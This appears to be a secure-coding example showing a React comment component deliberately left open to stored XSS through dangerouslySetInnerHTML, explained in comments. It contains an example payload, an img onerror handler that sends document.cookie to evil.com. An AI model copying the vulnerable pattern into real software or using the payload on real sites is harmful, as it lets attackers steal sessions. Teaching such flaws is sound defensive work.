// ❌ VULNERABLE — Stored XSS
// `comment.body` came from ANOTHER user and is rendered as raw HTML.
function Comment({ comment }) {
  return <div dangerouslySetInnerHTML={{ __html: comment.body }} />
}

// Attack: another user posts this as their comment body —
//   <img src=x onerror="fetch('https://evil.com/steal?c=' + document.cookie)">
// When YOUR browser renders the comment, the onerror handler runs in YOUR
// session and ships your cookies to the attacker. Every viewer is compromised.
//
// Root cause: untrusted data placed into the DOM as HTML, so the browser
// executes any markup/handlers inside it.
